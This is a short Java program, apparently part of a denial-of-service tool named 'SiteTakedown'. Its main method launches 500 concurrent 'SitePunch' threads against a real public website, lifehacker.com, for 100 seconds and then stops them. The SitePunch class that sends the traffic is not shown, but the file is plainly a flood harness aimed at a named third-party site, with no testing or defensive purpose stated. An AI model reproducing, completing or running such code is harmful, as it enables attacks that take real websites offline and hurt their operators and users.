package sitetakedown;

import java.util.ArrayList;
import java.util.logging.Level;
import java.util.logging.Logger;

public class SiteTakedown {

    public static void main(String[] args) {
        
        ArrayList<SitePunch> sp = new ArrayList<SitePunch>();
        
        for(int i=0;i<500;i++){
            sp.add(new SitePunch());
            sp.get(i).setSite("http://lifehacker.com/");
        }

        for(SitePunch punch:sp){
            punch.start();
        }
        try {
            Thread.sleep(100000);
        } catch (InterruptedException ex) {
        }
        
        for(SitePunch punch:sp){
            punch.shutdown();
        }
    }

}
